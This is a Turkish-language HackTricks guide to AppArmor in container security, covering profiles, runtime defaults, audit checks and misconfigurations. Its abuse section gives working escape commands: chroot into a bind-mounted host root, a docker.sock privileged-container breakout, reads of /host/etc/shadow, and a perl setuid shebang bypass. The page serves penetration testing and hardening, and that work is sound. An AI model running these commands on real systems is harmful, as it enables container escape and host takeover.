# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

AppArmor, program başına profiller aracılığıyla kısıtlamalar uygulayan bir **Zorunlu Erişim Denetimi** sistemidir. Büyük ölçüde kullanıcı ve grup sahipliğine bağlı olan geleneksel DAC denetimlerinden farklı olarak AppArmor, kernel'in sürece bağlı bir politikayı uygulamasını sağlar. Container ortamlarında bu önemlidir; çünkü bir iş yükü, bir eylemi gerçekleştirmeye yetecek geleneksel ayrıcalıklara sahip olsa bile AppArmor profili ilgili yola, mount işlemine, ağ davranışına veya capability kullanımına izin vermediği için bu eylem engellenebilir.

En önemli kavramsal nokta, AppArmor'un **yol tabanlı** olmasıdır. SELinux'un yaptığı gibi etiketler yerine, dosya sistemi erişimini yol kuralları üzerinden değerlendirir. Bu yaklaşımı anlaşılır ve güçlü kılar; ancak bind mount'ların ve alternatif yol düzenlerinin dikkatle ele alınması gerektiği anlamına da gelir. Aynı host içeriğine farklı bir yol üzerinden erişilebilir hâle gelirse, politikanın etkisi operatörün başlangıçta beklediği gibi olmayabilir.

## Container İzolasyonundaki Rolü

Container güvenlik incelemeleri genellikle capabilities ve seccomp ile sınırlı kalır; ancak bu denetimlerden sonra da AppArmor önemini korur. Gereğinden fazla ayrıcalığa sahip bir container'ı ya da operasyonel nedenlerle fazladan bir capability'ye ihtiyaç duyan bir iş yükünü düşünün. AppArmor, bariz kötüye kullanım yolunu engelleyecek şekilde dosya erişimini, mount davranışını, ağ kullanımını ve yürütme kalıplarını hâlâ kısıtlayabilir. Bu nedenle, "uygulamayı çalıştırmak için" AppArmor'u devre dışı bırakmak, yalnızca riskli olan bir yapılandırmayı fark ettirmeden aktif olarak istismar edilebilir hâle getirebilir.

## Laboratuvar

Host'ta AppArmor'un etkin olup olmadığını kontrol etmek için şunu kullanın:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Mevcut container sürecinin hangi bağlam altında çalıştığını görmek için:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Aradaki fark öğreticidir. Normal durumda süreç, runtime tarafından seçilen profile bağlı bir AppArmor bağlamı göstermelidir. unconfined durumunda ise bu ek kısıtlama katmanı ortadan kalkar.

Docker'ın ne uyguladığını düşündüğünü de inceleyebilirsiniz:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Çalışma Zamanında Kullanım

Docker, ana makine destekliyorsa varsayılan veya özel bir AppArmor profili uygulayabilir. Podman da AppArmor tabanlı sistemlerde AppArmor ile entegre olabilir; ancak SELinux öncelikli dağıtımlarda diğer MAC sistemi genellikle ön plana çıkar. Kubernetes, AppArmor'ı gerçekten destekleyen düğümlerde iş yükü düzeyinde AppArmor politikasını kullanıma sunabilir. LXC ve Ubuntu ailesiyle ilişkili sistem kapsayıcısı ortamları da AppArmor'ı yaygın olarak kullanır.

Pratikte önemli olan, AppArmor'ın bir "Docker özelliği" olmamasıdır. AppArmor, çeşitli runtime'ların uygulamayı seçebileceği bir ana makine çekirdeği özelliğidir. Ana makine bunu desteklemiyorsa veya runtime'a kısıtlamasız çalışması söylenmişse, sözde koruma gerçekte mevcut değildir.

Kubernetes özelinde modern API `securityContext.appArmorProfile` şeklindedir. Kubernetes `v1.30` sürümünden itibaren eski beta AppArmor açıklamaları kullanımdan kaldırılmıştır. Desteklenen ana makinelerde varsayılan profil `RuntimeDefault` olurken `Localhost`, düğümde önceden yüklenmiş olması gereken bir profile işaret eder. Bu, inceleme sırasında önemlidir; çünkü bir manifest AppArmor'ı dikkate alıyor gibi görünse de tamamen düğüm tarafındaki desteğe ve önceden yüklenmiş profillere bağlı olabilir.<sup>[[1]](#references)</sup>

İnce ama operasyonel açıdan faydalı bir ayrıntı, `appArmorProfile.type: RuntimeDefault` değerini açıkça ayarlamanın alanı hiç belirtmemekten daha katı olmasıdır. Alan açıkça ayarlanmışsa ve düğüm AppArmor'ı desteklemiyorsa, kabul işlemi başarısız olmalıdır. Alan belirtilmezse iş yükü AppArmor olmayan bir düğümde yine de çalışabilir ve bu ek kısıtlama katmanını almayabilir. Saldırgan açısından bu, hem manifesti hem de düğümün mevcut durumunu kontrol etmek için iyi bir nedendir.<sup>[[1]](#references)</sup>

AppArmor destekli Docker ana makinelerinde en bilinen varsayılan profil `docker-default` profilidir. Bu profil Moby'nin AppArmor şablonundan oluşturulur ve bazı capability tabanlı PoC'lerin varsayılan bir kapsayıcıda neden hâlâ başarısız olduğunu açıklaması bakımından önemlidir. Genel olarak `docker-default`, olağan ağ kullanımına izin verir; `/proc`'un büyük bölümüne yazmayı ve `/sys`'in hassas kısımlarına erişimi engeller; mount işlemlerini bloke eder ve ptrace'i, ana makineyi genel olarak yoklamak için kullanılabilecek bir ilkel olmayacak şekilde kısıtlar. Bu temel davranışı anlamak, "kapsayıcıda `CAP_SYS_ADMIN` var" ile "kapsayıcı bu yeteneği önemsediğim çekirdek arayüzlerine karşı gerçekten kullanabiliyor" durumlarını ayırt etmeye yardımcı olur.

## Profil Yönetimi

AppArmor profilleri genellikle `/etc/apparmor.d/` altında saklanır. Yaygın bir adlandırma kuralı, yürütülebilir dosya yolundaki eğik çizgileri noktayla değiştirmektir. Örneğin, `/usr/bin/man` için bir profil genellikle `/etc/apparmor.d/usr.bin.man` konumunda saklanır. Bu ayrıntı hem savunma hem de değerlendirme sırasında önemlidir; çünkü etkin profilin adını öğrendikten sonra ana makinede karşılık gelen dosyayı çoğu zaman hızlıca bulabilirsiniz.

Ana makine tarafında kullanılabilecek yönetim komutları şunlardır:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Bu komutların bir container-security kaynağında önemli olmasının nedeni, profillerin gerçekte nasıl oluşturulduğunu, yüklendiğini, complain moduna geçirildiğini ve uygulama değişikliklerinden sonra güncellendiğini açıklamalarıdır. Bir operatör sorun giderirken profilleri complain moduna alıp enforcement moduna geri döndürmeyi unutuyorsa, container belgelerde korumalı görünebilirken gerçekte çok daha gevşek davranabilir.

### Profilleri Oluşturma ve Güncelleme

`aa-genprof`, uygulama davranışını izleyebilir ve etkileşimli olarak profil oluşturulmasına yardımcı olabilir:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof`, daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profili oluşturabilir:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

İkili dosya değiştiğinde ve politikanın güncellenmesi gerektiğinde `aa-logprof`, günlüklerde bulunan reddetme kayıtlarını yeniden oynatabilir ve operatörün bunlara izin verip vermemeye karar vermesine yardımcı olabilir:

```bash
sudo aa-logprof
```

### Günlükler

AppArmor engellemeleri genellikle `auditd`, syslog veya `aa-notify` gibi araçlar üzerinden görülebilir:

```bash
sudo aa-notify -s 1 -v
```

Bu, operasyonel ve saldırı açısından yararlıdır. Savunmacılar profilleri iyileştirmek için kullanır. Saldırganlar ise hangi tam yolun veya işlemin engellendiğini ve bir exploit zincirini engelleyen denetimin AppArmor olup olmadığını öğrenmek için kullanır.

### Tam Profil Dosyasını Belirleme

Bir runtime, container için belirli bir AppArmor profil adı gösterdiğinde, bu adı diskteki profil dosyasıyla eşleştirmek çoğu zaman yararlıdır:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Bu, özellikle host tarafındaki inceleme sırasında kullanışlıdır; çünkü "container, `lowpriv` profili altında çalıştığını söylüyor" ile "gerçek kurallar, denetlenebilen veya yeniden yüklenebilen şu dosyada bulunuyor" arasındaki boşluğu kapatır.

### Denetlenmesi Gereken Önemli Kurallar

Bir profili okuyabiliyorsanız, basit `deny` satırlarıyla yetinmeyin. Birkaç kural türü, AppArmor'ın container escape girişimine karşı ne kadar etkili olacağını önemli ölçüde değiştirir:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: hedef binary'yi kısıtlamasız çalıştırır. Erişilebilir bir yardımcı program, shell veya interpreter için `ux` izni varsa, genellikle ilk test edilmesi gereken budur.
- `px` / `Px` ve `cx` / `Cx`: exec sırasında profil geçişi yapar. Bunlar otomatik olarak kötü değildir, ancak denetlenmeye değerdir; çünkü geçiş, mevcut profilden çok daha geniş kapsamlı bir profile yönlendirebilir.
- `change_profile`: bir görevin hemen veya bir sonraki exec sırasında başka bir yüklenmiş profile geçmesine izin verir. Hedef profil daha zayıfsa, bu kısıtlayıcı bir etki alanından çıkmak için tasarlanmış bir kaçış yoluna dönüşebilir.
- `flags=(complain)`, `flags=(unconfined)` veya daha yeni olan `flags=(prompt)`: bunlar, profile ne kadar güveneceğinizi değiştirmelidir. `complain`, engellemeleri uygulamak yerine kaydeder; `unconfined` sınırı kaldırır; `prompt` ise yalnızca kernel tarafından uygulanan engelleme yerine userspace karar yoluna bağlıdır.
- `userns` veya `userns create,`: daha yeni AppArmor policy, user namespace oluşturulmasını denetleyebilir. Bir container profili buna açıkça izin veriyorsa, platform hardening stratejisinin bir parçası olarak AppArmor kullansa bile iç içe user namespace'ler kullanılabilir durumda kalır.

Host tarafında kullanışlı grep komutu:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Bu tür bir denetim, yüzlerce sıradan dosya kuralına bakmaktan çoğu zaman daha faydalıdır. Bir breakout; bir helper çalıştırmaya, yeni bir namespace'e girmeye veya daha az kısıtlayıcı bir profile geçmeye bağlıysa, yanıt genellikle bariz `deny /etc/shadow r` tarzı satırlarda değil, geçiş odaklı bu kurallarda gizlidir.

## Yanlış Yapılandırmalar

En bariz hata `apparmor=unconfined` kullanmaktır. Yöneticiler, profil tehlikeli veya beklenmedik bir şeyi doğru şekilde engellediği için başarısız olan bir uygulamada hata ayıklarken bunu sık sık ayarlar. Bu flag üretimde kalırsa MAC katmanı fiilen devre dışı bırakılmış olur.

Daha ince bir başka sorun, dosya izinleri normal göründüğü için bind mount'ların zararsız olduğunu varsaymaktır. AppArmor path-based olduğundan, host path'lerini alternatif mount konumlarında erişime açmak path kurallarıyla sorunlara yol açabilir. Üçüncü bir hata da host kernel AppArmor'ı gerçekten uygulamıyorsa, bir yapılandırma dosyasındaki profil adının pek bir anlamı olmadığını unutmaktır.

## Kötüye Kullanım

AppArmor devre dışı kaldığında, daha önce kısıtlanan işlemler birden çalışabilir: bind mount'lar üzerinden hassas path'leri okuma, normalde kullanımı daha zor olması gereken procfs veya sysfs bölümlerine erişme, capabilities/seccomp da izin veriyorsa mount ile ilgili işlemler yapma ya da profilin normalde engelleyeceği path'leri kullanma. AppArmor, capability tabanlı bir breakout girişiminin kâğıt üzerinde "çalışması gerekirken" pratikte neden başarısız olduğunu çoğu zaman açıklar. AppArmor'ı kaldırın; aynı girişim başarılı olmaya başlayabilir.

Bir path-traversal, bind-mount veya mount tabanlı kötüye kullanım zincirini durduran temel unsurun AppArmor olduğundan şüpheleniyorsanız, ilk adım genellikle profil varken ve yokken nelerin erişilebilir hâle geldiğini karşılaştırmaktır. Örneğin, bir host path'i container içine mount edilmişse, önce bu path'te ilerleyip onu okuyup okuyamadığınızı kontrol edin:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Container ayrıca `CAP_SYS_ADMIN` gibi tehlikeli bir capability'ye sahipse, en pratik testlerden biri, mount işlemlerini veya hassas kernel dosya sistemlerine erişimi engelleyen kontrolün AppArmor olup olmadığını belirlemektir:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Bir bind mount aracılığıyla bir host path'e zaten erişilebilen ortamlarda AppArmor korumasının kaybedilmesi, salt okunur bir bilgi ifşası sorununu doğrudan host dosyalarına erişim sorununa da dönüştürebilir:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Bu komutların amacı, breakout'ı tek başına AppArmor'ın oluşturduğu değildir. Amaç, AppArmor kaldırıldığında dosya sistemi ve mount tabanlı birçok kötüye kullanım yolunun hemen test edilebilir hâle gelmesidir.

### Tam Örnek: AppArmor Devre Dışı + Host Root Mount Edilmiş

Konteynerde host root zaten `/host` konumuna bind-mount edilmişse, AppArmor'ı kaldırmak engellenmiş bir dosya sistemi kötüye kullanım yolunu eksiksiz bir host escape'e dönüştürebilir:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Shell, host dosya sistemi üzerinden çalışmaya başladığında iş yükü, container sınırını fiilen aşmış olur:

```bash
id
hostname
cat /etc/shadow | head
```

### Tam Örnek: AppArmor Devre Dışı + Runtime Socket

Gerçek engel çalışma zamanı durumunu koruyan AppArmor ise, mount edilmiş bir socket tam bir kaçış için yeterli olabilir:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Bağımlı tam yol mount noktasına göre değişir, ancak sonuç aynıdır: AppArmor artık runtime API’ye erişimi engellemez ve runtime API, ana bilgisayarı ele geçirebilen bir container başlatabilir.

### Tam Örnek: Yol Tabanlı Bind-Mount Atlatması

AppArmor yol tabanlı olduğundan, `/proc/**` yolunu korumak, aynı ana bilgisayar procfs içeriğine farklı bir yol üzerinden erişilebildiğinde bunu otomatik olarak korumaz:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Etki, tam olarak neyin mount edildiğine ve alternatif yolun diğer kontrolleri de aşıp aşmadığına bağlıdır; ancak bu örüntü, AppArmor'ın neden tek başına değil, mount düzeniyle birlikte değerlendirilmesi gerektiğinin en açık nedenlerinden biridir.

### Tam Örnek: Shebang Bypass

AppArmor, bir profile shebang'inde adı geçen interpreter yerine çalıştırılan script'in yoluna bağlayabilir. Buna karşılık, interpreter'ı doğrudan çağırmak interpreter'ın profilini seçebilir. Bir [AppArmor maintainer bu ayrımı açıklıyor](https://bugs.launchpad.net/apparmor/+bug/1911431). Tarihsel bir örnekte, ilk satırı kısıtlanmış bir interpreter'ı işaret eden bir script söz konusuydu:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Örnek yalnızca, yorumlayıcının dosya capability'sinin etkin hâle gelebileceği ve betiğin gerçek exec attachment'ının işleme izin verdiği olası bir senaryodur. Yüklenen policy'yi ve process label'ını, capability bounding set'ini, `no_new_privs` değerini ve mount'un `nosuid` durumunu kontrol edin; yalnızca profil dosyasının adı veya `cap_setuid+ep` listesi, kullanılabilir bir geçiş olduğunu kanıtlamaz. Yorumlayıcı zincirleri ve alternatif yürütme yolları ayrıca incelenmelidir.

## Kontroller

Bu kontrollerin amacı üç soruyu hızlıca yanıtlamaktır: Host'ta AppArmor etkin mi, mevcut process kısıtlanmış mı ve runtime bu container'a gerçekten bir profil uygulamış mı?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Burada ilginç olanlar:

- `/proc/self/attr/current` `unconfined` gösteriyorsa, iş yükü AppArmor kısıtlamasından yararlanmıyor demektir.
- `aa-status`, AppArmor'ın devre dışı veya yüklü olmadığını gösteriyorsa, çalışma zamanı yapılandırmasındaki profil adı çoğunlukla kozmetiktir.
- `docker inspect`, `unconfined` veya beklenmeyen bir özel profil gösteriyorsa, dosya sistemi ya da mount tabanlı bir kötüye kullanım yolunun çalışmasının nedeni genellikle budur.
- `/sys/kernel/security/apparmor/profiles`, beklediğiniz profili içermiyorsa çalışma zamanı veya orkestratör yapılandırması tek başına yeterli değildir.
- Güvenliği artırıldığı varsayılan bir profil `ux`, geniş kapsamlı `change_profile`, `userns` ya da `flags=(complain)` türü kurallar içeriyorsa, pratikte sağladığı sınır profil adının düşündürdüğünden çok daha zayıf olabilir.

Bir container operasyonel nedenlerle zaten yükseltilmiş ayrıcalıklara sahipse AppArmor'ı etkin bırakmak, kontrollü bir istisna ile çok daha geniş kapsamlı bir güvenlik ihlali arasındaki farkı yaratabilir.

## Çalışma Zamanı Varsayılanları

| Çalışma zamanı / platform | Varsayılan durum | Varsayılan davranış | Sık görülen elle zayıflatma yöntemleri |
| --- | --- | --- | --- |
| Docker Engine | AppArmor destekleyen ana makinelerde varsayılan olarak etkin | Üzerinde değişiklik yapılmadıysa `docker-default` AppArmor profilini kullanır | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Ana makineye bağlı | AppArmor, `--security-opt` aracılığıyla desteklenir; ancak varsayılan ayar tam olarak ana makineye ve çalışma zamanına bağlıdır ve Docker'ın belgelenmiş `docker-default` profilinden daha az yaygındır | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Koşullu varsayılan | `appArmorProfile.type` belirtilmezse varsayılan `RuntimeDefault` olur; ancak bu yalnızca düğümde AppArmor etkinse uygulanır | `securityContext.appArmorProfile.type: Unconfined`, zayıf bir profille `securityContext.appArmorProfile.type: Localhost`, AppArmor desteği olmayan düğümler |
| Kubernetes altında containerd / CRI-O | Düğüm/çalışma zamanı desteğine bağlı | Kubernetes tarafından desteklenen yaygın çalışma zamanları AppArmor'ı destekler; ancak gerçek uygulama yine de düğüm desteğine ve iş yükü ayarlarına bağlıdır | Kubernetes satırındakiyle aynı; doğrudan çalışma zamanı yapılandırması da AppArmor'ı tamamen atlayabilir |

AppArmor için çoğu zaman en önemli değişken yalnızca çalışma zamanı değil, **ana makinedir**. Manifestteki bir profil ayarı, AppArmor'ın etkin olmadığı bir düğümde kısıtlama oluşturmaz.

## References

- [1] [Kubernetes güvenlik bağlamı: AppArmor profil alanları ve düğüm desteği davranışı](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` man sayfası: exec geçişleri, `change_profile`, `userns` ve profil bayrakları](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
